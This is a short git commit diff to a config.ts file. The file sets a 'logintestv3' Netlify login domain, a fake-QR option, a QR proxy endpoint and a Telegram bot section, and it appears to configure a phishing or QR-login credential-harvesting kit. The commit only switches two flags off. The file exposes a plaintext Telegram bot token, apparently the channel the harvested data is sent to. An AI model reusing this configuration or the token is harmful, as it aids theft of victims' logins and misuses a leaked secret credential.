eb965582e2ec549135dc2511225fb81a2121a68c
wololoaoe123 <139802626+wololoaoe123@users.noreply.github.com>
2023-08-15 14:11:05 +0200

    Update config.ts

--- config.ts
+++ config.ts
@@ -2,9 +2,9 @@
 export const domain = 'logintestv3.netlify.app';
 export const fullDomain = `https://${domain}`;
 export const proxies: string[] = [];
-export const fakeQr = true;
+export const fakeQr = false;
 export const qrCodeEndpoint = 'localhost:8080/proxy';
-export const hostingOnVPS = true;
+export const hostingOnVPS = false;
 
 // TELEGRAM DETAILS
 export const telegramToken = '6529370298:AAF6qOaZBC3TZwj07yOoyYlqs22RDKmdqUU';
